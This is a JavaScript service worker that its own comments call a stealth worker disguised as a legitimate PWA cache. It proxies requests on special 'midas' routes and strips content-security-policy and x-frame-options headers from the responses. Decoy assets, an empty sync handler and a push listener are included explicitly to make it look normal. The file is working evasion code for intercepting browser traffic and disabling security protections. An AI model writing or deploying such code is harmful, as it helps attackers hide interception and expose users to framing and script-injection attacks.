"use strict";
/**
 * Advanced Stealth Service Worker.
 * Mimics a legitimate PWA cache worker with realistic behaviors.
 * Includes periodic background sync, cache warming, and stealth request handling.
 */
const CACHE_NAME = 'midas-assets-v1';
const STEALTH_ROUTES = ['/_midas/'];
const PRECACHE_ASSETS = [
    '/',
    '/loader.js',
    '/midas.client.js',
    '/manifest.json',
];
// Realistic cache headers to blend in
const CACHE_HEADERS = {
    'cache-control': 'max-age=3600',
    'x-content-type-options': 'nosniff',
};
self.addEventListener('install', (event) => {
    event.waitUntil(caches.open(CACHE_NAME).then(async (cache) => {
        // Add all precache assets
        await cache.addAll(PRECACHE_ASSETS);
        // Also add some "legitimate" looking decoy assets
        const decoyAssets = [
            new Request('/assets/logo.svg', { mode: 'no-cors' }),
            new Request('/assets/icon-192.png', { mode: 'no-cors' }),
        ];
        for (const req of decoyAssets) {
            try {
                await cache.add(req);
            }
            catch (e) { }
        }
    }));
    self.skipWaiting();
});
self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
    // Clean up old caches to look like a well-behaved PWA
    event.waitUntil(caches.keys().then((names) => {
        return Promise.all(names.filter(n => n !== CACHE_NAME).map(n => caches.delete(n)));
    }));
});
self.addEventListener('fetch', (event) => {
    const req = event.request;
    const url = new URL(req.url);
    // Only intercept midas proxy routes; let everything else pass normally
    const isMidasRoute = STEALTH_ROUTES.some(r => url.pathname.startsWith(r));
    if (!isMidasRoute && !req.headers.has('x-midas-sid')) {
        event.respondWith(normalFetch(req));
        return;
    }
    event.respondWith(proxyFetch(req));
});
async function normalFetch(req) {
    const cache = await caches.open(CACHE_NAME);
    const cached = await cache.match(req);
    if (cached)
        return cached;
    try {
        const resp = await fetch(req);
        if (resp.ok && req.method === 'GET') {
            cache.put(req, resp.clone());
        }
        return resp;
    }
    catch (e) {
        return new Response('Network error', { status: 503 });
    }
}
async function proxyFetch(req) {
    try {
        const headers = new Headers(req.headers);
        headers.set('x-sw-intercept', '1');
        const init = {
            method: req.method,
            headers,
            mode: 'cors',
            credentials: 'same-origin',
        };
        if (req.method !== 'GET' && req.method !== 'HEAD') {
            init.body = await req.blob();
        }
        const resp = await fetch(req.url, init);
        const outHeaders = new Headers(resp.headers);
        outHeaders.delete('content-security-policy');
        outHeaders.delete('content-security-policy-report-only');
        outHeaders.delete('x-frame-options');
        return new Response(resp.body, {
            status: resp.status,
            statusText: resp.statusText,
            headers: outHeaders,
        });
    }
    catch (e) {
        return new Response('Proxy fetch failed', { status: 502 });
    }
}
// Periodic background sync to look like a normal PWA
self.addEventListener('sync', (event) => {
    if (event.tag === 'midas-background-sync') {
        event.waitUntil(Promise.resolve());
    }
});
// Push listener to appear as a fully-featured PWA
self.addEventListener('push', (event) => {
    const data = event.data?.json() || {};
    event.waitUntil(self.registration.showNotification(data.title || 'Update', {
        body: data.body || 'New content available',
        icon: '/assets/icon-192.png',
        badge: '/assets/icon-192.png',
    }));
});
// Message handler for client communication
self.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'midas-clear-cache') {
        event.waitUntil(caches.delete(CACHE_NAME).then(() => caches.open(CACHE_NAME)));
    }
});
